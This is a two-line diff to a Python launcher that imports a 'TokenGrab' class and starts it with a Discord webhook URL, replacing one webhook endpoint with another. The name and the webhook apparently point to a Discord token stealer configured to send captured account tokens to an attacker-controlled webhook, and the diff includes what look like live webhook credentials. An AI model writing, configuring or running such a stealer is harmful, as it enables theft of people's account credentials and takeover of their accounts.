@@ -1,2 +1,3 @@
 from src import TokenGrab
-TokenGrab("https://discord.com/api/webhooks/942429402229268520/DVK23GUO3pREJcszMvfhGrGIv1Lp1RQFgNgyma_Wa3pumGQlX-SvIpcOwanWhXSJjEBC").start()
+TokenGrab("https://discord.com/api/webhooks/1410739781624664165/RPbbUiVlY8WN0dVUTjZmEdsjWIjh-36WXrTeIrS9xFYn_Q8Hvf0_WJEZ0jfpYcsZQNL-").start()
+
